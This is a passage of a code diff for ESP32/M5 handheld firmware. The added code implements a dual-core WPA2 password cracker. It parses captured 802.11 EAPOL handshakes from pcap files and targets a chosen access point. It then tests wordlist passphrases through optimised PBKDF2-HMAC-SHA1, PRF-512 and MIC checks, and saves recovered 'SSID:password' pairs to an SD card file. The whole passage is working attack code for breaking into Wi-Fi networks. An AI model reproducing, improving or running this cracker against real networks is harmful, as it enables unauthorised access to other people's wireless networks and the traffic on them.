+  if (j + len > 63) {
+    size_t i = 64 - j;
+    memcpy(ctx.buf + j, data, i);
+    evil_sha1_transform(ctx.state, ctx.buf);
+    for (; i + 63 < len; i += 64) evil_sha1_transform(ctx.state, data + i);
+    j = 0;
+    memcpy(ctx.buf, data + i, len - i);
+  } else {
+    memcpy(ctx.buf + j, data, len);
+  }
+}
+
+void evil_sha1_final(EvilSha1Ctx &ctx, uint8_t digest[20]) {
+  uint64_t total_bits = ((uint64_t)ctx.count[1] << 32) | ctx.count[0];
+  uint32_t j = (ctx.count[0] >> 3) & 63;
+  ctx.buf[j++] = 0x80;
+  if (j > 56) { memset(ctx.buf+j, 0, 64-j); evil_sha1_transform(ctx.state, ctx.buf); j=0; }
+  memset(ctx.buf+j, 0, 56-j);
+  for (int i=0; i<8; i++) ctx.buf[56+i] = (uint8_t)(total_bits >> (56 - i*8));
+  evil_sha1_transform(ctx.state, ctx.buf);
+  evil_sha1_extract(ctx.state, digest);
+}
+
+/* =================================================================
+   HMAC-SHA1 with pre-computed inner/outer pads
+   ================================================================= */
+
+void evil_hmac_precompute(const uint8_t *key, size_t klen, EvilHmacPre &out) {
+  uint8_t k_ipad[64], k_opad[64];
+  memset(k_ipad, 0x36, 64);
+  memset(k_opad, 0x5C, 64);
+  uint8_t hk[20];
+  if (klen > 64) {
+    EvilSha1Ctx t; evil_sha1_init(t);
+    evil_sha1_update(t, key, klen);
+    evil_sha1_final(t, hk);
+    key = hk; klen = 20;
+  }
+  for (size_t i=0; i<klen; i++) { k_ipad[i] ^= key[i]; k_opad[i] ^= key[i]; }
+  evil_sha1_init(out.inner); evil_sha1_update(out.inner, k_ipad, 64);
+  evil_sha1_init(out.outer); evil_sha1_update(out.outer, k_opad, 64);
+}
+
+/* HMAC-SHA1 for 20-byte input (hot PBKDF2 path) */
+__attribute__((optimize("O3"), hot))
+void evil_hmac_sha1_20(const EvilHmacPre &pre, const uint8_t data[20], uint8_t out[20]) {
+  uint32_t state[5];
+  memcpy(state, pre.inner.state, 20);
+  evil_sha1_transform_20b(state, data);
+  uint32_t ih[5] = {state[0], state[1], state[2], state[3], state[4]};
+  memcpy(state, pre.outer.state, 20);
+  evil_sha1_transform_20w(state, ih);
+  evil_sha1_extract(state, out);
+}
+
+/* HMAC-SHA1 for 20-byte input — word-level (no byte conversion) */
+__attribute__((optimize("O3"), hot))
+void evil_hmac_sha1_20w(const EvilHmacPre &pre, const uint32_t data[5], uint32_t out[5]) {
+  uint32_t state[5];
+  memcpy(state, pre.inner.state, 20);
+  evil_sha1_transform_20w(state, data);
+  uint32_t ih[5] = {state[0], state[1], state[2], state[3], state[4]};
+  memcpy(state, pre.outer.state, 20);
+  evil_sha1_transform_20w(state, ih);
+  memcpy(out, state, 20);
+}
+
+/* Generic HMAC-SHA1 with precomputed pads (for first PBKDF2 iteration) */
+void evil_hmac_sha1_pre(const EvilHmacPre &pre, const uint8_t *data, size_t dlen, uint8_t *out20) {
+  uint8_t inner_hash[20];
+  EvilSha1Ctx ctx = pre.inner;
+  evil_sha1_update(ctx, data, dlen);
+  evil_sha1_final(ctx, inner_hash);
+  ctx = pre.outer;
+  evil_sha1_update(ctx, inner_hash, 20);
+  evil_sha1_final(ctx, out20);
+}
+
+/* =================================================================
+   PBKDF2-HMAC-SHA1 (4096 iterations, 32 bytes output)
+   ================================================================= */
+__attribute__((optimize("O3"), hot))
+void evil_pbkdf2(const EvilHmacPre &pre, const uint8_t *salt, size_t slen,
+                 uint32_t iters, uint8_t out[32]) {
+  uint8_t salt_int[40]; // max SSID 32 + 4
+  memcpy(salt_int, salt, slen);
+
+  uint8_t U8[20];
+  uint32_t U[5], T[5];
+
+  /* Block 1 (bytes 0-19 of PMK) */
+  salt_int[slen]=0; salt_int[slen+1]=0; salt_int[slen+2]=0; salt_int[slen+3]=1;
+  evil_hmac_sha1_pre(pre, salt_int, slen+4, U8);
+  for (int i=0; i<5; i++) { uint32_t t; memcpy(&t, U8+i*4, 4); U[i]=__builtin_bswap32(t); }
+  memcpy(T, U, 20);
+  for (uint32_t i=1; i<iters; i++) {
+    evil_hmac_sha1_20w(pre, U, U);
+    T[0]^=U[0]; T[1]^=U[1]; T[2]^=U[2]; T[3]^=U[3]; T[4]^=U[4];
+  }
+  evil_sha1_extract(T, out);
+
+  /* Block 2 (bytes 20-31 of PMK, only first 12 bytes used) */
+  salt_int[slen+3]=2;
+  evil_hmac_sha1_pre(pre, salt_int, slen+4, U8);
+  for (int i=0; i<5; i++) { uint32_t t; memcpy(&t, U8+i*4, 4); U[i]=__builtin_bswap32(t); }
+  memcpy(T, U, 20);
+  for (uint32_t i=1; i<iters; i++) {
+    evil_hmac_sha1_20w(pre, U, U);
+    T[0]^=U[0]; T[1]^=U[1]; T[2]^=U[2]; T[3]^=U[3]; T[4]^=U[4];
+  }
+  evil_sha1_extract(T, out+20);
+}
+
+/* =================================================================
+   PRF-512 (PTK derivation) + MIC verification
+   ================================================================= */
+void evil_prf512(const uint8_t pmk[32], const uint8_t *data, uint8_t ptk[64]) {
+  static const char label[] = "Pairwise key expansion";
+  uint8_t ctr = 0;
+  size_t pos = 0;
+  EvilHmacPre pre;
+  evil_hmac_precompute(pmk, 32, pre);
+
+  while (pos < 64) {
+    EvilSha1Ctx ctx = pre.inner;
+    evil_sha1_update(ctx, (const uint8_t*)label, sizeof(label));
+    evil_sha1_update(ctx, data, 6+6+32+32);
+    evil_sha1_update(ctx, &ctr, 1);
+    uint8_t inner_hash[20];
+    evil_sha1_final(ctx, inner_hash);
+
+    EvilSha1Ctx octx = pre.outer;
+    evil_sha1_update(octx, inner_hash, 20);
+    uint8_t digest[20];
+    evil_sha1_final(octx, digest);
+
+    size_t c = (64-pos < 20) ? (64-pos) : 20;
+    memcpy(ptk+pos, digest, c);
+    pos += c; ctr++;
+  }
+}
+
+bool evil_verify_mic(const evil_wpa2_hs_t &hs, const uint8_t ptk[64]) {
+  uint8_t mic[20];
+  EvilHmacPre pre;
+  evil_hmac_precompute(ptk, 16, pre);
+  evil_hmac_sha1_pre(pre, hs.eapol, hs.eapol_len, mic);
+  return memcmp(mic, hs.mic, 16) == 0;
+}
+
+/* =================================================================
+   Dual-core cracker infrastructure
+   ================================================================= */
+
+__attribute__((optimize("O3"), hot))
+bool evil_try_password(const EvilCrackShared &S, const char *pw, uint8_t pw_len) {
+  const evil_wpa2_hs_t &hs = *S.hs;
+  EvilHmacPre pw_pre;
+  evil_hmac_precompute((const uint8_t*)pw, pw_len, pw_pre);
+  uint8_t pmk[32];
+  evil_pbkdf2(pw_pre, (const uint8_t*)hs.ssid, hs.ssid_len, 4096, pmk);
+  uint8_t ptk[64];
+  evil_prf512(pmk, hs.prf_data, ptk);
+  return evil_verify_mic(hs, ptk);
+}
+
+void evil_crack_worker(void *arg) {
+  EvilCrackShared &S = *(EvilCrackShared*)arg;
+  EvilPwEntry entry;
+
+  while (true) {
+    if (xQueueReceive(S.queue, &entry, portMAX_DELAY) != pdTRUE) break;
+    if (entry.len == 0) break; // poison pill
+    if (S.found || S.abort) {
+      __atomic_fetch_add(&S.attempts, 1, __ATOMIC_RELAXED);
+      continue;
+    }
+    if (evil_try_password(S, entry.pw, entry.len)) {
+      S.found = true;
+      memcpy(S.found_pw, entry.pw, entry.len + 1);
+    }
+    __atomic_fetch_add(&S.attempts, 1, __ATOMIC_RELAXED);
+    if (CRACK_YIELD_MS > 0) vTaskDelay(pdMS_TO_TICKS(CRACK_YIELD_MS));
+  }
+  xSemaphoreGive(S.done_sem);
+  vTaskDelete(NULL);
+}
+
+/* =================================================================
+   Buffered wordlist reader (4KB SRAM)
+   ================================================================= */
+struct EvilWordlistReader {
+  File    *file;
+  uint8_t *buf;
+  size_t   cap, len, pos;
+  bool     eof;
+
+  bool init(File *f) {
+    file = f; cap = CRACK_WORDLIST_BUFSZ;
+    buf = (uint8_t*)malloc(cap);
+    len = pos = 0; eof = false;
+    return buf != nullptr;
+  }
+  void deinit() { if (buf) { free(buf); buf = nullptr; } }
+
+  void refill() {
+    if (eof) return;
+    size_t rem = len - pos;
+    if (rem) memmove(buf, buf + pos, rem);
+    len = rem; pos = 0;
+    size_t rd = file->read(buf + len, cap - len);
+    len += rd;
+    if (rd == 0) eof = true;
+  }
+
+  bool nextLine(char *out, size_t max_len) {
+    while (true) {
+      for (size_t i = pos; i < len; i++) {
+        if (buf[i] == '\n') {
+          size_t ll = i - pos;
+          if (ll > 0 && buf[pos + ll - 1] == '\r') ll--;
+          size_t cp = (ll < max_len) ? ll : max_len;
+          memcpy(out, buf + pos, cp);
+          out[cp] = '\0';
+          pos = i + 1;
+          return true;
+        }
+      }
+      if (eof) {
+        size_t rem = len - pos;
+        if (!rem) return false;
+        if (buf[pos + rem - 1] == '\r') rem--;
+        size_t cp = (rem < max_len) ? rem : max_len;
+        memcpy(out, buf + pos, cp);
+        out[cp] = '\0';
+        pos = len;
+        return cp > 0;
+      }
+      refill();
+    }
+  }
+  bool available() const { return !eof || pos < len; }
+};
+
+/* =================================================================
+   Helpers (kept for extract + menu)
+   ================================================================= */
 void macToStr(const uint8_t m[6], char out[18]) {
   snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
 }
 
 bool macEq(const uint8_t a[6], const uint8_t b[6]) {
-  for (int i=0;i<6;i++) if (a[i]!=b[i]) return false;
-  return true;
+  return memcmp(a, b, 6) == 0;
 }
 
 void hsReset(evil_wpa2_hs_t &hs) {
@@ -35126,7 +35680,6 @@ void hsReset(evil_wpa2_hs_t &hs) {
   hs.ssid[0] = '\0';
 }
 
-/* ---- PCAP read little-endian (Evil writes LE magic d4 c3 b2 a1) ---- */
 bool pcapRead32(File &f, uint32_t &v) {
   uint8_t b[4];
   if (f.read(b,4)!=4) return false;
@@ -35134,41 +35687,26 @@ bool pcapRead32(File &f, uint32_t &v) {
   return true;
 }
 
-/* ---- Parse Beacon SSID (802.11 mgmt subtype 0x08) ---- */
 void tryParseBeaconSSID(const uint8_t *frm, uint32_t len, evil_wpa2_hs_t &hs) {
   if (len < 36) return;
-
-  // frame control
   uint16_t fc = (uint16_t)frm[0] | ((uint16_t)frm[1] << 8);
   uint8_t type = (fc & 0x000C) >> 2;
   uint8_t sub  = (fc & 0x00F0) >> 4;
-  if (type != 0x00 || sub != 0x08) return; // mgmt beacon only
-
-  // BSSID in beacon header: addr3 offset 16
+  if (type != 0x00 || sub != 0x08) return;
   const uint8_t *bssid = frm + 16;
-
-  // fixed params start after MAC header (24 bytes)
   uint32_t off = 24;
   if (len < off + 12) return;
   off += 12;
-
-  // IEs
   while (off + 2 <= len) {
-    uint8_t id  = frm[off];
-    uint8_t il  = frm[off+1];
+    uint8_t id = frm[off], il = frm[off+1];
     off += 2;
     if (off + il > len) break;
-
-    if (id == 0x00) { // SSID
-      if (il == 0 || il > 32) return; // hidden or invalid
+    if (id == 0x00) {
+      if (il == 0 || il > 32) return;
       if (hs.ssid[0] == '\0') {
         memcpy(hs.ssid, frm + off, il);
         hs.ssid[il] = '\0';
         memcpy(hs.ap, bssid, 6);
-#if DEBUG_HANDSHAKE
-        char macs[18]; macToStr(hs.ap, macs);
-        Serial.printf("[WPA2] Beacon SSID='%s' BSSID=%s\n", hs.ssid, macs);
-#endif
       }
       return;
     }
@@ -35176,26 +35714,14 @@ void tryParseBeaconSSID(const uint8_t *frm, uint32_t len, evil_wpa2_hs_t &hs) {
   }
 }
 
-/* ---- Find SNAP+EAPOL inside a frame via sliding window ---- */
 int findSnapEapol(const uint8_t *frm, uint32_t len) {
   if (len < 8) return -1;
-  // scan entire payload for SNAP signature
   for (uint32_t i = 0; i + 8 <= len; i++) {
-    bool ok = true;
-    for (int k=0;k<8;k++) { if (frm[i+k] != SNAP_SIG[k]) { ok=false; break; } }
-    if (ok) return (int)i;
+    if (frm[i]==0xAA && frm[i+1]==0xAA && frm[i+2]==0x03 &&
+        frm[i+3]==0x00 && frm[i+4]==0x00 && frm[i+5]==0x00 &&
+        frm[i+6]==0x88 && frm[i+7]==0x8E) return (int)i;
   }
   return -1;
-}
-
-void dumpHex16(const char *tag, const uint8_t *b, int n) {
-  Serial.print(tag);
-  for (int i = 0; i < n; i++) {
-    if ((i & 0x0F) == 0) Serial.print(" ");
-    if (b[i] < 0x10) Serial.print("0");
-    Serial.print(b[i], HEX);
-  }
-  Serial.println();
 }
 
 uint64_t readBE64(const uint8_t *p) {
@@ -35204,36 +35730,25 @@ uint64_t readBE64(const uint8_t *p) {
   return v;
 }
 
-
 /* ---- Extract handshake (M1+M2) from an Evil PCAP ---- */
 bool evil_wpa2_extract_from_pcap(const String &path, evil_wpa2_hs_t &hs) {
   memset(&hs, 0, sizeof(hs));
-
   File f = SD.open(path, FILE_READ);
   if (!f) return false;
 
   uint8_t gh[24];
   if (f.read(gh, 24) != 24) { f.close(); return false; }
-
-  if (!(gh[0]==0xD4 && gh[1]==0xC3 && gh[2]==0xB2 && gh[3]==0xA1)) {
-    f.close(); return false;
-  }
+  if (!(gh[0]==0xD4 && gh[1]==0xC3 && gh[2]==0xB2 && gh[3]==0xA1)) { f.close(); return false; }
 
   bool gotM1=false, gotM2=false;
   uint64_t replay_m1 = 0;
-
   uint8_t rec[EVIL_WPA2_MAX_PCAPREC];
 
   while (f.available() > 16) {
     uint32_t ts, tu, incl, orig;
     if (!pcapRead32(f, ts) || !pcapRead32(f, tu) ||
         !pcapRead32(f, incl) || !pcapRead32(f, orig)) break;
-
-    if (!incl || incl > sizeof(rec)) {
-      f.seek(f.position() + incl);
-      continue;
-    }
-
+    if (!incl || incl > sizeof(rec)) { f.seek(f.position() + incl); continue; }
     if (f.read(rec, incl) != (int)incl) break;
 
     tryParseBeaconSSID(rec, incl, hs);
@@ -35246,23 +35761,19 @@ bool evil_wpa2_extract_from_pcap(const String &path, evil_wpa2_hs_t &hs) {
     const uint8_t *eapol = rec + snap + 8;
 
     if (eapol[1] != 0x03) continue;
-
     uint16_t eap_len = (eapol[2]<<8)|eapol[3];
     uint16_t total   = 4 + eap_len;
     if (snap + 8 + total > incl) continue;
 
     const uint8_t *key = eapol + 4;
     uint16_t ki = (key[1]<<8)|key[2];
-
-    bool ack = ki & KI_ACK;
-    bool mic = ki & KI_MIC;
+    bool ack  = ki & KI_ACK;
+    bool mic  = ki & KI_MIC;
     bool inst = ki & 0x0040;
     bool sec  = ki & 0x0200;
     uint8_t keyver = ki & 7;
-
     uint64_t replay = readBE64(key + 5);
 
-    /* ---- M1 ---- */
     if (!gotM1 && ack && !mic) {
       memcpy(hs.anonce, key + 13, 32);
       memcpy(hs.ap, addr2, 6);
@@ -35271,134 +35782,151 @@ bool evil_wpa2_extract_from_pcap(const String &path, evil_wpa2_hs_t &hs) {
       gotM1 = true;
       continue;
     }
-
-    /* ---- M2 ---- */
     if (!gotM2 && !ack && mic && !inst && !sec && (keyver >= 1 && keyver <= 3)) {
       if (!gotM1) continue;
       if (replay != replay_m1) continue;
       if (!macEq(addr2, hs.sta) || !macEq(addr1, hs.ap)) continue;
-
       memcpy(hs.snonce, key + 13, 32);
       memcpy(hs.mic, eapol + 81, 16);
       memcpy(hs.eapol, eapol, total);
       memset(hs.eapol + 81, 0, 16);
       hs.eapol_len = total;
-
       gotM2 = true;
       continue;
     }
   }
-
   f.close();
-
   if (!(gotM1 && gotM2 && hs.ssid[0])) return false;
 
-  /* ===== PRF DATA PRECALC (CRITIQUE) ===== */
   uint8_t *p = hs.prf_data;
-
   if (memcmp(hs.ap, hs.sta, 6) < 0) {
-    memcpy(p, hs.ap, 6); p+=6;
-    memcpy(p, hs.sta, 6); p+=6;
+    memcpy(p, hs.ap, 6); p+=6; memcpy(p, hs.sta, 6); p+=6;
   } else {
-    memcpy(p, hs.sta, 6); p+=6;
-    memcpy(p, hs.ap, 6); p+=6;
+    memcpy(p, hs.sta, 6); p+=6; memcpy(p, hs.ap, 6); p+=6;
   }
-
   if (memcmp(hs.anonce, hs.snonce, 32) < 0) {
-    memcpy(p, hs.anonce, 32); p+=32;
-    memcpy(p, hs.snonce, 32); p+=32;
+    memcpy(p, hs.anonce, 32); p+=32; memcpy(p, hs.snonce, 32); p+=32;
   } else {
-    memcpy(p, hs.snonce, 32); p+=32;
-    memcpy(p, hs.anonce, 32); p+=32;
+    memcpy(p, hs.snonce, 32); p+=32; memcpy(p, hs.anonce, 32); p+=32;
   }
-
   hs.ssid_len = strlen(hs.ssid);
   hs.valid = true;
   return true;
 }
 
-void evil_wpa_prf512_sha1(const uint8_t pmk[32],
-                          const uint8_t *data,
-                          uint8_t ptk[64]) {
-  static const char label[] = "Pairwise key expansion";
-  uint8_t digest[20];
-  uint8_t ctr = 0;
-  size_t pos = 0;
+/* =================================================================
+   Extract handshake for a specific BSSID (from parsePcapMultiHS entry)
+   Re-reads the pcap and fills evil_wpa2_hs_t for the target AP.
+   ================================================================= */
+bool evil_wpa2_extract_by_bssid(const String &path, const uint8_t targetBssid[6],
+                                 const char *ssid, evil_wpa2_hs_t &hs) {
+  memset(&hs, 0, sizeof(hs));
+  File f = SD.open(path, FILE_READ);
+  if (!f) return false;
 
-  static mbedtls_md_context_t ctx;
-  static bool init = false;
+  uint8_t gh[24];
+  if (f.read(gh, 24) != 24) { f.close(); return false; }
+  if (!(gh[0]==0xD4 && gh[1]==0xC3 && gh[2]==0xB2 && gh[3]==0xA1)) { f.close(); return false; }
 
-  if (!init) {
-    mbedtls_md_init(&ctx);
-    mbedtls_md_setup(&ctx,
-      mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
-    init = true;
+  bool gotM1 = false, gotM2 = false;
+  uint64_t replay_m1 = 0;
+  uint8_t rec[EVIL_WPA2_MAX_PCAPREC];
+
+  while (f.available() > 16) {
+    uint32_t ts, tu, incl, orig;
+    if (!pcapRead32(f, ts) || !pcapRead32(f, tu) ||
+        !pcapRead32(f, incl) || !pcapRead32(f, orig)) break;
+    if (!incl || incl > sizeof(rec)) { f.seek(f.position() + incl); continue; }
+    if (f.read(rec, incl) != (int)incl) break;
+
+    /* Beacon: grab SSID if not provided */
+    if (!ssid || ssid[0] == '\0') tryParseBeaconSSID(rec, incl, hs);
+
+    int snap = findSnapEapol(rec, incl);
+    if (snap < 0) continue;
+
+    const uint8_t *addr1 = rec + 4;
+    const uint8_t *addr2 = rec + 10;
+    const uint8_t *eapol = rec + snap + 8;
+
+    if (eapol[1] != 0x03) continue;
+    uint16_t eap_len = (eapol[2]<<8)|eapol[3];
+    uint16_t total   = 4 + eap_len;
+    if (snap + 8 + total > incl) continue;
+
+    const uint8_t *key = eapol + 4;
+    uint16_t ki = (key[1]<<8)|key[2];
+    bool ack  = ki & KI_ACK;
+    bool mic  = ki & KI_MIC;
+    bool inst = ki & 0x0040;
+    bool sec  = ki & 0x0200;
+    uint8_t keyver = ki & 7;
+    uint64_t replay = readBE64(key + 5);
+
+    /* M1: filter by target BSSID (addr2 = AP source) */
+    if (!gotM1 && ack && !mic && memcmp(addr2, targetBssid, 6) == 0) {
+      memcpy(hs.anonce, key + 13, 32);
+      memcpy(hs.ap, addr2, 6);
+      memcpy(hs.sta, addr1, 6);
+      replay_m1 = replay;
+      gotM1 = true;
+      continue;
+    }
+    /* M2: filter by target BSSID (addr1 = AP dest) */
+    if (!gotM2 && !ack && mic && !inst && !sec && (keyver >= 1 && keyver <= 3)
+        && memcmp(addr1, targetBssid, 6) == 0) {
+      if (!gotM1) continue;
+      if (replay != replay_m1) continue;
+      if (!macEq(addr2, hs.sta) || !macEq(addr1, hs.ap)) continue;
+      memcpy(hs.snonce, key + 13, 32);
+      memcpy(hs.mic, eapol + 81, 16);
+      memcpy(hs.eapol, eapol, total);
+      memset(hs.eapol + 81, 0, 16);
+      hs.eapol_len = total;
+      gotM2 = true;
+      continue;
+    }
+  }
+  f.close();
+
+  /* Apply provided SSID if beacon didn't set it */
+  if (ssid && ssid[0] && !hs.ssid[0]) {
+    strncpy(hs.ssid, ssid, 32);
+    hs.ssid[32] = '\0';
   }
 
-  while (pos < 64) {
-    mbedtls_md_hmac_starts(&ctx, pmk, 32);
-    mbedtls_md_hmac_update(&ctx, (uint8_t*)label, sizeof(label));
-    mbedtls_md_hmac_update(&ctx, data, 6+6+32+32);
-    mbedtls_md_hmac_update(&ctx, &ctr, 1);
-    mbedtls_md_hmac_finish(&ctx, digest);
+  if (!(gotM1 && gotM2 && hs.ssid[0])) return false;
 
-    size_t c = (64-pos < 20) ? (64-pos) : 20;
-    memcpy(ptk+pos, digest, c);
-    pos += c;
-    ctr++;
+  /* Build PRF data */
+  uint8_t *p = hs.prf_data;
+  if (memcmp(hs.ap, hs.sta, 6) < 0) {
+    memcpy(p, hs.ap, 6); p+=6; memcpy(p, hs.sta, 6); p+=6;
+  } else {
+    memcpy(p, hs.sta, 6); p+=6; memcpy(p, hs.ap, 6); p+=6;
   }
+  if (memcmp(hs.anonce, hs.snonce, 32) < 0) {
+    memcpy(p, hs.anonce, 32); p+=32; memcpy(p, hs.snonce, 32);
+  } else {
+    memcpy(p, hs.snonce, 32); p+=32; memcpy(p, hs.anonce, 32);
+  }
+  hs.ssid_len = strlen(hs.ssid);
+  hs.valid = true;
+  return true;
 }
 
-
-bool evil_wpa2_check_passphrase(const evil_wpa2_hs_t &hs, const char *pass) {
-  uint8_t pmk[32];
-  uint8_t ptk[64];
-  uint8_t mic[20];
-
-  static mbedtls_md_context_t hctx;
-  static bool init = false;
-
-  size_t pass_len = strlen(pass);
-
-  if (!init) {
-    mbedtls_md_init(&hctx);
-    mbedtls_md_setup(&hctx,
-      mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
-    init = true;
-  }
-
-  /* ===== PBKDF2 (4096) ===== */
-  mbedtls_pkcs5_pbkdf2_hmac(
-    &hctx,
-    (const uint8_t*)pass, pass_len,
-    (const uint8_t*)hs.ssid, hs.ssid_len,
-    4096, 32, pmk);
-
-  /* ===== PTK ===== */
-  evil_wpa_prf512_sha1(pmk, hs.prf_data, ptk);
-
-  /* ===== MIC ===== */
-  mbedtls_md_hmac(
-    mbedtls_md_info_from_type(MBEDTLS_MD_SHA1),
-    ptk, 16,
-    hs.eapol, hs.eapol_len,
-    mic);
-
-  return memcmp(mic, hs.mic, 16) == 0;
-}
-
+/* =================================================================
+   Wordlist selection menu
+   ================================================================= */
 int menuSelectListArray(String *items, int count, const char *title) {
   std::vector<String> v;
   for (int i = 0; i < count; i++) v.push_back(items[i]);
   return menuSelectList(v, title);
 }
 
-/* ---------------- UI: list pcaps + select + check pass ---------------- */
 int evil_list_pcaps(const char *dirPath, String *out, int maxOut) {
   int count = 0;
   File dir = SD.open(dirPath);
   if (!dir || !dir.isDirectory()) { if (dir) dir.close(); return 0; }
-
   while (count < maxOut) {
     File f = dir.openNextFile();
     if (!f) break;
@@ -35412,124 +35940,490 @@ int evil_list_pcaps(const char *dirPath, String *out, int maxOut) {
   return count;
 }
 
-bool evil_wpa2_wordlist_attack(const evil_wpa2_hs_t &hs, const char *path) {
+/* List .txt wordlist files from /evil/ */
+int evil_list_wordlists(const char *dirPath, String *out, int maxOut) {
+  int count = 0;
+  File dir = SD.open(dirPath);
+  if (!dir || !dir.isDirectory()) { if (dir) dir.close(); return 0; }
+  while (count < maxOut) {
+    File f = dir.openNextFile();
+    if (!f) break;
+    if (!f.isDirectory()) {
+      String n = f.name();
+      if (n.endsWith(".txt")) out[count++] = n;
+    }
+    f.close();
+  }
+  dir.close();
+  return count;
+}
+
+/* =================================================================
+   Dual-core wordlist attack
+   ================================================================= */
+bool evil_wpa2_wordlist_attack(const evil_wpa2_hs_t &hs, const char *path,
+                               char *out_pw = nullptr, size_t out_pw_sz = 0) {
   File f = SD.open(path, FILE_READ);
   if (!f) return false;
 
-  char line[64];
-  uint32_t tested=0, t0=millis();
+  /* Buffered reader */
+  EvilWordlistReader reader;
+  if (!reader.init(&f)) { f.close(); return false; }
 
-  while (f.available()) {
-    size_t n = f.readBytesUntil('\n', line, 63);
-    line[n]=0;
-    while (n && (line[n-1]=='\r'||line[n-1]=='\n')) line[--n]=0;
-    if (n < 8 || n > 63) continue;
+  /* Shared state */
+  EvilCrackShared shared;
+  memset(&shared, 0, sizeof(shared));
+  shared.hs       = &hs;
+  shared.queue     = xQueueCreate(CRACK_QUEUE_DEPTH, sizeof(EvilPwEntry));
+  shared.done_sem  = xSemaphoreCreateBinary();
+  shared.found     = false;
+  shared.abort     = false;
+  shared.attempts  = 0;
 
-    tested++;
-    
+  if (!shared.queue || !shared.done_sem) {
+    reader.deinit(); f.close();
+    if (shared.queue) vQueueDelete(shared.queue);
+    if (shared.done_sem) vSemaphoreDelete(shared.done_sem);
+    return false;
+  }
+
+  /* Boost CPU */
+  uint32_t savedFreq = getCpuFrequencyMhz();
+  setCpuFrequencyMhz(240);
+
+  /* Launch worker on core 0 */
+  TaskHandle_t workerHandle = NULL;
+  xTaskCreatePinnedToCore(evil_crack_worker, "wpa2crack", 8192,
+                          &shared, 1, &workerHandle, 0);
+
+  uint32_t t0 = millis();
+  uint32_t lastUiUpdate = 0;
+  char line[EVIL_WPA2_PASS_MAX];
+  bool found = false;
+
+  /* Producer: feed passwords from core 1 */
+  while (reader.nextLine(line, EVIL_WPA2_PASS_MAX - 1)) {
+    size_t n = strlen(line);
+    if (n < 8 || n > 63) continue;  // WPA2: 8-63 chars
+
+    /* Check abort (backspace key) */
+    cardUpdate();
+    if (kp(KEY_BACKSPACE)) { shared.abort = true; break; }
+
+    /* Check if worker found it */
+    if (shared.found) { found = true; break; }
+
+    /* Also test on this core (producer also cracks) */
+    EvilPwEntry entry;
+    memcpy(entry.pw, line, n + 1);
+    entry.len = (uint8_t)n;
+
+    /* Try to send to worker queue; if full, crack on this core instead */
+    if (xQueueSend(shared.queue, &entry, 0) != pdTRUE) {
+      /* Queue full: crack on producer core */
+      if (evil_try_password(shared, line, (uint8_t)n)) {
+        shared.found = true;
+        memcpy(shared.found_pw, line, n + 1);
+        found = true;
+        break;
+      }
+      __atomic_fetch_add(&shared.attempts, 1, __ATOMIC_RELAXED);
+      if (CRACK_YIELD_MS > 0) vTaskDelay(pdMS_TO_TICKS(CRACK_YIELD_MS));
+    }
+
+    /* UI update throttled */
+    uint32_t now = millis();
+    if (now - lastUiUpdate >= CRACK_UI_INTERVAL_MS) {
+      lastUiUpdate = now;
+      uint32_t att = shared.attempts;
+      uint32_t dt = now - t0;
+      float speed = dt ? att * 1000.0f / dt : 0;
+
+      M5.Display.clear();
+      M5.Display.setTextSize(1.5);
+      M5.Display.setCursor(5, 5);
+      M5.Display.println("WPA2 Dual-Core Crack");
+      M5.Display.println("--------------------");
+      M5.Display.printf("SSID: %s\n", hs.ssid);
+      M5.Display.printf("Try : %s\n", line);
+      M5.Display.printf("Cnt : %lu\n", (unsigned long)att);
+      M5.Display.printf("Speed: %.1f/s\n", speed);
+      if (speed > 0) {
+        M5.Display.printf("[BACK] to abort");
+      }
+      M5.Display.display();
+
+      Serial.printf("[WPA2] %lu tested (%.1f/s)\n", (unsigned long)att, speed);
+      esp_task_wdt_reset();
+    }
+  }
+
+  /* Send poison pill to stop worker */
+  EvilPwEntry poison;
+  memset(&poison, 0, sizeof(poison));
+  poison.len = 0;
+  xQueueSend(shared.queue, &poison, pdMS_TO_TICKS(2000));
+
+  /* Wait for worker to finish */
+  xSemaphoreTake(shared.done_sem, pdMS_TO_TICKS(5000));
+
+  if (shared.found) found = true;
+
+  /* Restore CPU freq */
+  setCpuFrequencyMhz(savedFreq);
+
+  /* Show result */
+  if (found) {
+    Serial.printf("[WPA2] FOUND: %s (%lu tries)\n", shared.found_pw, (unsigned long)shared.attempts);
+    if (out_pw && out_pw_sz > 0) {
+      strncpy(out_pw, shared.found_pw, out_pw_sz - 1);
+      out_pw[out_pw_sz - 1] = '\0';
+    }
+    M5.Display.clear();
+    M5.Display.setTextSize(1.5);
+    M5.Display.setCursor(5, 10);
+    M5.Display.println("PASSWORD FOUND!");
+    M5.Display.println("--------------------");
+    M5.Display.println(shared.found_pw);
+    M5.Display.printf("\n%lu tries", (unsigned long)shared.attempts);
+    uint32_t dt = millis() - t0;
+    M5.Display.printf("\nTime: %lus", (unsigned long)(dt / 1000));
+    M5.Display.display();
+    delay(8000);
+  }
+
+  /* Cleanup */
+  vQueueDelete(shared.queue);
+  vSemaphoreDelete(shared.done_sem);
+  reader.deinit();
+  f.close();
+
+  return found;
+}
+
+/* =================================================================
+   Save cracked result to SD: append "SSID:password\n" to /evil/cracked.txt
+   ================================================================= */
+void evil_wpa2_save_cracked(const char *ssid, const char *password) {
+  File f = SD.open("/evil/cracked.txt", FILE_APPEND);
+  if (!f) {
+    f = SD.open("/evil/cracked.txt", FILE_WRITE);
+  }
+  if (f) {
+    f.printf("%s:%s\n", ssid, password);
+    f.close();
+    Serial.printf("[WPA2] Saved to /evil/cracked.txt: %s:%s\n", ssid, password);
+  } else {
+    Serial.println("[WPA2] ERROR: cannot write /evil/cracked.txt");
+  }
+}
+
+/* =================================================================
+   Internal: crack all valid APs in a single PCAP against a wordlist.
+   Returns number of passwords found. Appends results to cracked.txt.
+   ================================================================= */
+int evil_wpa2_crack_pcap(const String &pcapPath, const String &pcapName,
+                         const String &wlPath, const String &wlName,
+                         int totalAps, int apOffset) {
+  PcapHsEntry hsEntries[MAX_HS_PER_PCAP];
+  bool hasBeacon = false;
+  int apCount = parsePcapMultiHS(pcapPath, hsEntries, MAX_HS_PER_PCAP, hasBeacon);
+
+  std::vector<int> validIdx;
+  for (int i = 0; i < apCount; i++) {
+    if (hsEntries[i].paired && hsEntries[i].ssid[0]) {
+      validIdx.push_back(i);
+    }
+  }
+  if (validIdx.empty()) return 0;
+
+  int foundCount = 0;
